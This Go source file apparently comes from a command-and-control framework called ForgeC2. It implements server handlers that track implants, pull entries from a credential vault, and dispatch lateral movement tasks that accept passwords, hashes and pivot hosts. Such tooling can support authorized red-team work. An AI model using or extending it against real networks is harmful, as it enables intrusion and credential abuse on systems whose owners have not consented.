package server

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// handleLateralPage renders the lateral movement page
func (s *Server) handleLateralPage(c *gin.Context) {
	stats := s.getNavStats()

	// Get available agents
	var agents []db.Implant
	s.db.Where("status = 'online'").Limit(5000).Find(&agents)

	// Get credentials from vault
	var credentials []db.CredentialEntry
	s.db.Order("created_at desc").Limit(50).Find(&credentials)

	// Get statistics
	var onlineAgents int64
	s.db.Model(&db.Implant{}).Where("status = 'online'").Count(&onlineAgents)

	var totalCreds int64
	s.db.Model(&db.CredentialEntry{}).Count(&totalCreds)

	var totalTasks int64
	s.db.Model(&db.Task{}).Where("type = 'lateral'").Count(&totalTasks)

	data := gin.H{
		"Title":        "ForgeC2 - Lateral Movement",
		"ActiveNav":    "lateral",
		"Stats":        stats,
		"Agents":       agents,
		"Credentials":  credentials,
		"OnlineAgents": onlineAgents,
		"TotalCreds":   totalCreds,
		"TotalTasks":   totalTasks,
	}
	s.renderPageOrJSON(c, data)
}

// handleLateralHistory returns lateral movement history
func (s *Server) handleLateralHistory(c *gin.Context) {
	agentID := c.Param("id")

	var tasks []db.Task
	s.db.Where("agent_id = ? AND type = 'lateral'", agentID).
		Order("created_at desc").
		Limit(50).
		Find(&tasks)

	c.JSON(http.StatusOK, gin.H{
		"tasks": tasks,
		"total": len(tasks),
	})
}

// handleProcessLateralResult processes lateral movement results from agent
func (s *Server) handleProcessLateralResult(c *gin.Context) {
	var req struct {
		TaskID  uint   `json:"task_id"`
		AgentID string `json:"agent_id"`
		Success bool   `json:"success"`
		Output  string `json:"output"`
		Error   string `json:"error"`
		Target  string `json:"target"`
		Method  string `json:"method"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}

	// Update task
	updates := map[string]interface{}{
		"status": "completed",
		"result": req.Output,
	}

	if !req.Success {
		updates["status"] = "failed"
		updates["error"] = req.Error
	}

	if err := s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(updates).Error; err != nil {
		slog.Error("Failed to update lateral task", "task_id", req.TaskID, "err", err)
	}

	// If successful, add target to network hosts
	if req.Success && req.Target != "" {
		host := db.NetworkHost{
			AgentID:  req.AgentID,
			IP:       req.Target,
			Hostname: "",
			OS:       "",
			Services: fmt.Sprintf(`[{"method":"%s","port":0}]`, req.Method),
			LastSeen: time.Now(),
		}
		if err := s.db.Where("agent_id = ? AND ip = ?", req.AgentID, req.Target).FirstOrCreate(&host, db.NetworkHost{
			AgentID: req.AgentID,
			IP:      req.Target,
		}).Error; err != nil {
			slog.Error("Failed to create network host from lateral result", "err", err)
		}
	}

	c.JSON(http.StatusOK, gin.H{"success": true})
}

// handleAPILateralExecute dispatches a lateral movement task via JSON API
func (s *Server) handleAPILateralExecute(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req struct {
		Source     string `json:"source"`
		Target     string `json:"target"`
		Method     string `json:"method"`
		Credential string `json:"credential,omitempty"`
		Username   string `json:"username,omitempty"`
		Password   string `json:"password,omitempty"`
		Command    string `json:"command,omitempty"`
		Hash       string `json:"hash,omitempty"`
		KeyPath    string `json:"key_path,omitempty"`
		Port       string `json:"port,omitempty"`
		Share      string `json:"share,omitempty"`
		Namespace  string `json:"namespace,omitempty"`
		Pivot      string `json:"pivot,omitempty"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.Source == "" || req.Target == "" || req.Method == "" {
		respondError(c, http.StatusBadRequest, "source, target and method required")
		return
	}
	spec, err := json.Marshal(req)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to encode spec")
		return
	}
	task, err := s.createTask(req.Source, "lateral", string(spec), "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Lateral movement via JSON API", "agent", req.Source, "target", req.Target, "method", req.Method)
	s.broadcastTaskUpdate(req.Source, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}
